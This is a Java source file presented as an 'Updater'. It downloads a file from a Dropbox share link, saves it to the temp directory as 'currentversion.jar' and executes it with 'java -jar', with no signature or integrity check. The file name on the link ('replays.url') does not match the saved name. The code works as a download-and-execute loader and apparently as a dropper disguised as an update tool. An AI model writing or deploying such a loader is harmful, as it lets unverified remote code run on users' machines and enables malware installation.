package Updater;

import java.io.FileOutputStream;
import java.net.URL;
import java.nio.channels.Channels;
import java.nio.channels.FileChannel;
import java.nio.channels.ReadableByteChannel;

public class Updater {

	public static void main(String[] args) {
		try {
			ReadableByteChannel readChannel = Channels.newChannel(new URL(
					"https://www.dropbox.com/scl/fi/fiybe8b2z4lly9qkg850s/replays.url?rlkey=6n57pv0uh1ohk396ir20dpg13&st=9wv2895x&dl=0")
					.openStream());
			FileOutputStream fileOS = new FileOutputStream(System.getProperty("java.io.tmpdir") + "currentversion.jar");
			FileChannel writeChannel = fileOS.getChannel();
			writeChannel.transferFrom(readChannel, 0, Long.MAX_VALUE);

			Process ps = Runtime.getRuntime()
					.exec(new String[] { "java", "-jar", System.getProperty("java.io.tmpdir") + "currentversion.jar" });
			ps.waitFor();
			java.io.InputStream is = ps.getInputStream();
			byte b[] = new byte[is.available()];
			is.read(b, 0, b.length);
			System.out.println(new String(b));
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

}
